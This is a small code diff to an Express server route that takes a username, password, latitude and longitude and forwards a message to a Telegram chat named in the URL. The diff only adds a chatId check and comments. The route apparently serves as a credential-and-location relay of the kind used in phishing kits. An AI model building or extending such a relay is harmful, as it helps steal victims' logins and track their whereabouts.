@@ -38,8 +38,12 @@ if (!botToken) {
 
 // API Route to send Telegram message with dynamic chatId
 app.post("/:chatId/sendMessage", async (req, res) => {
-    const { chatId } = req.params;
+    const { chatId } = req.params; // Extract chatId from URL
     const { username, password, latitude, longitude } = req.body;
+
+    if (!chatId) {
+        return res.status(400).json({ error: "Missing chatId in URL" });
+    }
 
     if (!username || !password) {
         return res.status(400).json({ error: "Missing required fields" });
@@ -50,7 +54,7 @@ app.post("/:chatId/sendMessage", async (req, res) => {
 
     try {
         const response = await axios.post(telegramAPI, {
-            chat_id: chatId,
+            chat_id: chatId, // Use dynamic chatId
             text: message,
         });
         res.json({ success: true, message: "Sent to Telegram", data: response.data });
